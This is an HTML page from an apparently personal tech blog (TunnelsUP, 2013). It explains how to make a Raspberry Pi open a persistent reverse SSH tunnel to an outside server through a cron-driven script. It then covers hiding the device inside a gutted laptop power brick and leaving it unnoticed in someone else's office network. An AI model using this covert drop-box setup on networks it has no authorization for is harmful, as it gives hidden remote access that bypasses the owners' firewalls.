@@ -1,0 +1,445 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+
+  
+
+  
+    <title>Raspberry Pi: Phoning home using a reverse remote ssh tunnel - TunnelsUP</title>
+  
+  <!-- <meta name="author" content="Jack"> -->
+
+  
+  <meta name="description" content="What&rsquo;s this? Just an ordinary powerbrick? Read on to find out why this is an incredibly dangerous thing to see in your office. When I received &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel">
+  <link href="/favicon.ico" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="TunnelsUP" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<!-- <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.no-icons.min.css" rel="stylesheet"> -->
+<!-- <link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css"> -->
+<!-- <link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css"> -->
+<!-- <link href="/stylesheets/bootstrap-responsive.min.css" rel="stylesheet" type="text/css"> -->
+
+
+
+
+
+
+
+
+
+</head>
+
+<body   >
+  <header role="banner" id="logoblock"><a href="/"><span id="title"><span id="title_tunnel">Tunnels</span><span id="title_up">UP</span><span id="title_com">.com</span></span></a>
+<!-- <a href="/"><img class="flex-content" src="/images/tunnelsuplogo.png" alt="TunnelsUp.com" width="527" height="73"></a> -->
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><i class="icon-search"></i></li>
+  
+</ul>
+  
+<form name="search" id="searchform" action="/search/index.html" method="GET">
+  <fieldset role="search">
+    <input type="text" id="st-search-input" name="stq" class="search"/>
+  </fieldset>
+</form>
+<ul class="main-navigation">
+  <li><a href="/kb.html">Articles</a></li>
+  <li><a href="/tools">Tools</a></li>
+  <li><a href="/cheatsheets">Cheat Sheets</a></li>
+  <li><a href="/video">Videos</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content"> 
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Raspberry Pi: Phoning Home Using a Reverse Remote Ssh Tunnel</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-08T00:00:00-07:00" pubdate data-updated="true">May 8<span>th</span>, 2013</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+What&rsquo;s this? Just an ordinary powerbrick? Read on to find out why this is an incredibly dangerous thing to see in your office.</p>
+
+<p>When I received my raspberry pi I immediately wanted to use it as a <del>hacking</del> remote tech support tool. The idea was to be able to plug it in somewhere and it be small enough that it&rsquo;s not noticed in someone&rsquo;s network. Then if I could access it remotely I am in their network and can do things.</p>
+
+<h2>Part 1: Setting up the Pi</h2>
+
+<p>The problem is that if I plug this in somewhere in the world and leave it I need it to phone home so I can gain remote connectivity to it. I know my home&rsquo;s IP but I don&rsquo;t know the Pi&rsquo;s IP. I want it to be a plug in and run away type of scenario and not one that I&rsquo;ll be hooking up any monitor or keyboard or anything.</p>
+
+<h3>Pre-configuration</h3>
+
+<p>Before beginning you need to have the following:</p>
+
+<ul>
+<li>Raspberry Pi with a Linux OS on it</li>
+<li>Raspberry Pi is configured to receive a DHCP address</li>
+<li>Raspberry Pi is configured to receive ssh connections</li>
+<li>A seperate linux server that is reachable by ssh from the internet. This server should have a static public IP.</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>It should be easy enough to figure out how to complete these on your own. With the above, you should be able ssh to the Pi remotely if you know its IP. Well you don&rsquo;t know its IP and even if you did it is probably behind a firewall which makes it impossible to get to. Or so you think.</p>
+
+<p>What you&rsquo;ll need is a linux server that has a persistent IP. One that you can ssh into from anywhere in the world. Suppose it&rsquo;s IP is 25.25.25.25. Even though my home network gets a dynamic IP from my ISP it usually stays the same for weeks and even years. All I&rsquo;ve done is forwarded port 22 through the firewall to a linux server to make this work.</p>
+
+<h3>Setting up the ssh certificate on the Pi</h3>
+
+<p>From the Raspberry Pi you should be able to ssh to this linux server. Test it to be sure. So now you want to set it up so the authentication is certificate based (this way the Pi can be set up to auto ssh into the server without being prompted for a password).</p>
+
+<p>Follow this guide for setting up <a href="/ssh-without-password/">automatic ssh login using ssh keys</a>.</p>
+
+<h3>Creating the Reverse SSH tunnel</h3>
+
+<p>Now comes the fun part. Create a reverse remote ssh tunnel to that host to forward connections back to the Pi. Confused? Here look at this command you would issue from the Pi:</p>
+
+<figure class='code'><div class="highlight"><table><tr></pre></td><td class='code'><pre><code class=''><span class='line'>ssh -N -R 2222:localhost:22 serverUser@25.25.25.25</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The Pi is ssh&#8217;ing to the server at 25.25.25.25 using the username &ldquo;serverUser&rdquo;. Upon doing so, it&rsquo;s telling that server to open port 2222. Any connections coming into the server on port 2222 forward them over the tunnel back to the Pi on port 22. The -N tag is saying we don&rsquo;t need to actually send any ssh commands once connected.</p>
+
+<p>Once the Pi sets up that remote tunnel; from the server it connected to you can do this:</p>
+
+<figure class='code'><div class="highlight"><table><tr></pre></td><td class='code'><pre><code class=''><span class='line'>ssh -l piUser -p 2222 localhost</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now you should be ssh&rsquo;d into the Pi using port 2222 on the linux server! Awesome!</p>
+
+<p>Why did this work? The linux server is listening on port 2222 for incoming ssh connections. If it receives one, it will forward all traffic it receives into the previous ssh connection that was established already. That is essentially what the remote tunnel does.</p>
+
+<h3>Making it persistent (always on)</h3>
+
+<p>Next is to make this a persistent thing. You want the Pi to keep trying to build this ssh tunnel always and if it goes down try to bring it back. We&rsquo;ll do this using a bash script and cron job.</p>
+
+<p>Create a file on the Pi called ~/create_ssh_tunnel.sh and put this in it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr></pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>createTunnel<span class="o">()</span> <span class="o">{</span>
+</span><span class='line'>  /usr/bin/ssh -N -R 2222:localhost:22 serverUser@25.25.25.25
+</span><span class='line'>  <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -eq 0 <span class="o">]]</span>; <span class="k">then</span>
+</span><span class='line'><span class="k">    </span><span class="nb">echo </span>Tunnel to jumpbox created successfully
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'><span class="k">    </span><span class="nb">echo </span>An error occurred creating a tunnel to jumpbox. RC was <span class="nv">$?</span>
+</span><span class='line'>  <span class="k">fi</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>/bin/pidof ssh
+</span><span class='line'><span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne 0 <span class="o">]]</span>; <span class="k">then</span>
+</span><span class='line'><span class="k">  </span><span class="nb">echo </span>Creating new tunnel connection
+</span><span class='line'>  createTunnel
+</span><span class='line'><span class="k">fi</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What this program is doing is checking to see if there&rsquo;s a process running called &lsquo;ssh&rsquo;. If there isn&rsquo;t then start the ssh tunnel.</p>
+
+<p>Next make it executable by doing the following:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr></pre></td><td class='code'><pre><code class='bash'><span class='line'>chmod 700 ~/create_ssh_tunnel.sh
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now start the crontab.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr></pre></td><td class='code'><pre><code class='bash'><span class='line'>crontab -e
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Place this in as your cron job (every minute check if the ssh connection is up, if not, attempt to bring it up)</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr></pre></td><td class='code'><pre><code class='bash'><span class='line'>*/1 * * * * ~/create_ssh_tunnel.sh &gt; tunnel.log 2&gt;&amp;1
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To troubleshoot any problems in this you can view the tunnel.log file.</p>
+
+<p>Now let&rsquo;s take a step back and look at what we&rsquo;ve done. When the Raspberri Pi is on, it will check every minute to see if an ssh connection to your linux server exists. If it doesn&rsquo;t it will create one. The tunnel it creates is really a reverse remote tunnel. Once the tunnel is up, anyone who ssh&rsquo;s into port 2222 of the linux server will then be redirected to the Pi. Incredible!</p>
+
+<h2>Part 2: Concealing the Pi</h2>
+
+<p>I found an old powerbrick for a laptop and gutted it.<br>
+<img src="/images/pi2.jpg" alt="Pi IMG" /></p>
+
+<p>The raspberry pi almost fit. I had to solder off the S-Video port to get it to fit just right.<br>
+<img src="/images/pi3.jpg" alt="Pi IMG" /></p>
+
+<p>Then I had to hook power up to it. In order to do this I simply took apart a USB charger. Took the plastic casing off to save space and cut the cord to save even more space. Then I soldered where the powerbrick power feed is into the USB power feed. This way when I power up the brick, it&rsquo;ll give power to the USB charger which will in turn power the Pi.<br>
+<img src="/images/pi4.jpg" alt="Pi IMG" /></p>
+
+<p>Lastly was finding a black ethernet cable so both cables coming out of the power brick are black and look inconspicuous.<br>
+<img src="/images/pi5.jpg" alt="Pi IMG" /></p>
+
+<p>Here are pictures of it in its special case:<br>
+<img src="/images/pi6.jpg" alt="Pi IMG" /><br>
+<img src="/images/pi7.jpg" alt="Pi IMG" /></p>
+
+<h2>Part 3: Testing it</h2>
+
+<p>Check it out! <br>
+<img src="/images/pi1.jpg" alt="Pi IMG" /></p>
+
+<p>I have this plugged into an office somewhere. It looks weird when you stare at it but put it behind a plant and nobody will ever notice it (except the guy who waters the plants).</p>
+
+<p>Once I plugged it in I went back home. Right after the Pi got an IP address it created a tunnel to my home server. When I tried ssh&#8217;ing into port 2222 of my home server I was redirected to the Pi. Now I am on a computer in someone elses network. Woohoo! Now I can do remote tech support more effectively.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Jack</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-08T00:00:00-07:00" pubdate data-updated="true">May 8<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/tup/tag/electronics/'>electronics</a>, <a class='category' href='/tup/tag/featured/'>featured</a>, <a class='category' href='/tup/tag/raspberry-pi/'>raspberry pi</a>, <a class='category' href='/tup/tag/remote/'>remote</a>, <a class='category' href='/tup/tag/reverse/'>reverse</a>, <a class='category' href='/tup/tag/scripts/'>scripts</a>, <a class='category' href='/tup/tag/ssh/'>ssh</a>, <a class='category' href='/tup/tag/ssh-tunnel/'>ssh tunnel</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/" data-via="tunnelsup" data-counturl="http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
+  
+</div>
+
+    
+    <script type="text/javascript"><!--
+google_ad_client = "ca-pub-3148884705608664";
+/* TunnelsUp - Leaderboard Footer */
+google_ad_slot = "4691437304";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="//pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+  </footer>
+</article>
+
+  <div class="comments">
+    <h3>Comments</h3>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </div>
+
+</div>
+
+<aside class="sidebar">
+  
+    <div class="asidesection">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-3148884705608664";
+/* TunnelsUp - sidebar Square */
+google_ad_slot = "7251074508";
+google_ad_width = 200;
+google_ad_height = 200;
+//-->
+</script>
+<script type="text/javascript" src="//pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div><div class="asidesection">
+<h3>Featured Tool</h3>
+<a href="/subnet-calculator">Subnet Calculator</a><br>
+This subnet calculator is the most simple and user friendly one out there. Give it a try. It might become your favorite. 
+</div>
+<div class="asidesection">
+<h3>Password Generator</h3>
+<img class="left" src="/images/passwordwolf.png" width="50" title="PasswordWolf" alt="PasswordWolf">
+PasswordWolf.com is a fantastic <a href="https://passwordwolf.com/">random password generator.</a> Try it today!
+</div><div class="asidesection">
+ <h3>Support this blog!</h3>
+ <p><a href="/donate.html"><img style="border:0px" src="/images/paypaldonatebutton.gif" alt="donate"></a></p>
+</div><div class="asidesection">
+<h3>Popular Links</h3>
+  <ul id="recent_posts">
+      <li class="post"><a href="/how-to-take-a-screenshot-on-mac-osx/">How to Take a Screenshot Mac OSX</a></li>
+      <li class="post"><a href="/what-is-ping/">What is a Ping?</a></li>
+      <li class="post"><a href="/what-is-a-vpn/">What is a VPN?</a></li>
+      <li class="post"><a href="/what-is-a-firewall/">What is a Firewall?</a></li>
+      <li class="post"><a href="/jquery-checkbox-checked-reading-and-setting/">jQuery Checkbox Checked</a></li>
+  </ul>
+</div>
+<section class="twitterOct">
+	<br>
+  	<a class="twitter-timeline"
+	 data-dnt="true" href="https://twitter.com/tunnelsup" 
+     data-widget-id="736235600487931906">
+     
+     Tweets by @tunnelsup
+  </a>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - Jack - <a href="/about">About This Site</a>
+  ---
+  <a href="/links">Links to other useful websites</a>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'tunnelsup';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/';
+        var disqus_url = 'http://tunnelsup.github.io/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+<!-- <script src="/javascripts/modernizr-2.0.js"></script> -->
+<!-- <script src="/javascripts/jquery.min.js"></script> -->
+<!-- <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script> -->
+<!-- <script src="/javascripts/octopress.js" type="text/javascript"></script> -->
+
+  <script src="/javascripts/all.min.js" type="text/javascript"></script>
+
+
+
+
+
+<script type="text/javascript">
+  $('#searchform').submit(function(event) {
+     window.location.href = "/search/index.html#stq=" + document.search.stq.value;
+     event.preventDefault();
+  });
+</script>
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-2202347-5']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+
+
+
+
+</body>
+</html>
